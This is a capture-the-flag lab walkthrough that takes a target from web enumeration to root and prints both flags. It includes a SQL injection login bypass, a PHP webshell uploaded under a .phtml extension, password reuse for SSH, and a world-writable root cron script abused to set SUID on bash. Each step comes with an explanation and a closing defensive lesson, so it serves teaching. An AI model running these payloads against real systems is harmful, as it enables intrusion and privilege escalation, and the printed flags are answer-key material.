set once — it fills into every command below

Goal. Capture the user and root flags. The foothold is a classic web chain; root comes from a scheduled job you are allowed to overwrite.

Scope. Only attack the IP you were given. Replace <target-ip> everywhere.

1Enumerate

Scan the host, then brute-force web paths.

nmap -sC -sV <target-ip>
#   22/tcp ssh      OpenSSH
#   80/tcp http     Apache + PHP

gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirb/common.txt
#   /admin     (admin console)
#   /uploads   (upload directory)

Why it works

  1. The front page only links to an admin console; content discovery reveals the /admin login and a writable /uploads directory that together form the attack path.

2SQLi login bypass

The login at /admin/ builds its query by string concatenation, so authentication can be bypassed:

username:  admin' -- -
password:  anything

You land in panel.php.

Why it works

  1. The query is SELECT * FROM admins WHERE username='$u' AND password='$p'.
  2. admin' -- - closes the username string and comments out the password check, so the row returns and you are "authenticated".

3Upload a webshell

The avatar upload blocks only .php/.php4/.php5, but Apache still executes .phtml as PHP. Upload shell.phtml:

<?php system($_GET['c']); ?>

Then run commands as www-data:

curl "http://<target-ip>/uploads/shell.phtml?c=id"
#   uid=33(www-data) ...

Why it works

  1. A blocklist (deny a few extensions) is weaker than an allowlist. It misses .phtml, which Debian's Apache maps to the PHP handler.
  2. The uploaded file lands in a web-served directory, so requesting it executes your code.

4Credential reuse → user

Read the app's DB config through the webshell:

curl "http://<target-ip>/uploads/shell.phtml?c=cat%20/var/www/html/admin/config.php"
#   $DB_PASS = 'Summer#Breeze88'

That password is reused by the system user webdev:

ssh webdev@<target-ip>     # Summer#Breeze88
cat /home/webdev/user.txt
user flagFLAG{upl04d_t0_w3bsh3ll_w1n}

Why it works

  1. Secrets in web config files are readable by the web user, and people reuse passwords across accounts — so the DB password unlocks an SSH user.

5Escalate to root

A root cron runs a world-writable script every minute:

cat /etc/cron.d/webbackup
#   * * * * * root /opt/scripts/backup.sh
ls -l /opt/scripts/backup.sh
#   -rwxrwxrwx  (anyone can edit it)

Overwrite it to give /bin/bash the SUID bit, wait for cron, then spawn a root shell:

echo 'chmod +s /bin/bash' > /opt/scripts/backup.sh
# wait up to 60s, then:
/bin/bash -p
# id -> euid=0(root)
cat /root/root.txt
root flagFLAG{cr0n_w0rld_wr1t4bl3_pwn}

Why it works

  1. The cron entry runs the script as root, and the script is world-writable, so webdev controls what root executes.
  2. chmod +s /bin/bash makes bash run with the owner's (root's) privileges; bash -p keeps that elevated id.

✓Both flags

userFLAG{upl04d_t0_w3bsh3ll_w1n}
rootFLAG{cr0n_w0rld_wr1t4bl3_pwn}

Lesson. Validate uploads with an allowlist, keep secrets out of web-readable config, never reuse passwords, and never let a root cron run a writable script.
